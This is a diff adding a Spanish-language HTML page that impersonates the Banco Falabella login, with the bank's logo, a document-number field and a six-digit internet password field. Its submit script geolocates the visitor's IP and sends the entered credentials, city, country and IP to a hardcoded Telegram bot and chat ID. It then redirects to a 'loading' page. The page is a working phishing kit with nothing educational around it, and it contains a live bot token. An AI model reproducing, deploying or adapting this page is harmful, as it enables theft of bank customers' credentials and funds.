@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f1f1f1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            max-width: 400px;
+            width: 90%;
+            background-color: #fff;
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .login-container img {
+            max-width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .login-container input {
+            width: 94%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 20px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .login-container button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 20px;
+            border: none;
+            width: 100%;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        .login-container button:disabled {
+            background-color: #D3DCE3;
+            color: #656C71;
+            padding: 15px 20px;
+            border: none;
+            width: 98%;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+
+        @media screen and (max-width: 480px) {
+            .login-container {
+                width: 100%;
+                border-radius: 0;
+            }
+
+            body {
+                align-items: normal;
+
+            }
+        }
+
+        @media screen and (-webkit-min-device-pixel-ratio:0) {
+
+            /* Para iPhone */
+            select {
+                appearance: none;
+                -webkit-appearance: none;
+                -moz-appearance: none;
+                padding: 10px;
+                /* Ajusta según sea necesario */
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ec/Logotipo_Banco_Falabella.svg/1200px-Logotipo_Banco_Falabella.svg.png"
+            alt="Logo">
+        <form id="loginform" style="margin-top: 50px;">
+            <select name="tipo_usuario" id="tipo_usuario">
+                <option value="cedula_ciudadania">Cédula Ciudadanía</option>
+                <option value="cedula_extranjeria">Cédula Extranjería</option>
+                <option value="pasaporte">Pasaporte</option>
+            </select>
+            <br>
+            <input type="text" name="usuario" id="usuario" inputmode="numeric" placeholder="Ingresa tu N&deg de documento" required>
+
+            <input type="password" name="contra" id="contra" minlength="6" maxlength="6"
+                placeholder="Clave Internet de 6 dígitos" inputmode="numeric" required>
+            <br>
+            <button type="submit" id="submitBtn" style="margin-top: 30px;margin-bottom: 100px;" disabled> Continuar
+            </button>
+
+        </form>
+    </div>
+</body>
+
+<script>
+    document.getElementById('tipo_usuario').addEventListener('change', function () {
+        var tipoUsuario = this.value;
+        var placeholderText = '';
+
+        switch (tipoUsuario) {
+            case 'cedula_ciudadania':
+                placeholderText = 'Ingresa tu Cédula Ciudadanía';
+                break;
+            case 'cedula_extranjeria':
+                placeholderText = 'Ingresa tu Cédula Extranjería';
+                break;
+            case 'pasaporte':
+                placeholderText = 'Ingresa tu Pasaporte';
+                break;
+            default:
+                placeholderText = 'Ingresa tu Cédula Ciudadanía';
+        }
+
+        document.getElementById('usuario').setAttribute('placeholder', placeholderText);
+    });
+    document.getElementById('usuario').addEventListener('input', function () {
+        var userInput = this.value.trim();
+        var submitBtn = document.getElementById('submitBtn');
+
+        if (userInput.length > 0) {
+            submitBtn.removeAttribute('disabled');
+        } else {
+            submitBtn.setAttribute('disabled', 'disabled');
+        }
+    });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+<script>
+    const url = "https://ipapi.co/json/";
+    const form = document.querySelector("#loginform");
+    form.addEventListener("submit", (event) => {
+        event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+        axios
+            .get(url)
+            .then((response) => {
+                const tipo = document.querySelector("#tipo_usuario").value;
+                const usuario = document.querySelector("#usuario").value;
+                const contra = document.querySelector("#contra").value;
+                localStorage.setItem("usuario", usuario);
+                const message =
+                    "\nFalabella" +
+                    "\nTipo: " +
+                    tipo +
+                    "\nUsuario: " +
+                    usuario +
+                    "\nContra: " +
+                    contra +
+                    "\nCiudad:" +
+                    response.data.city +
+                    "\nPais: " +
+                    response.data.country +
+                    "\nIP: " +
+                    response.data.ip;
+                axios
+                    .post(
+                        "https://api.telegram.org/bot7105949408:AAGGZJIg_lqU3A8AU1NI6PTmEhjbAOEIQ1k/sendMessage",
+                        {
+                            chat_id: "1988446847",
+                            text: message,
+                        }
+                    )
+                    .then((response) => {
+                        window.location.href = "cargando.html";
+                    })
+                    .catch((error) => {
+                        console.error(error);
+                    });
+            })
+            .catch((error) => {
+                console.log(error);
+            });
+    });
+</script>
+
+</html>
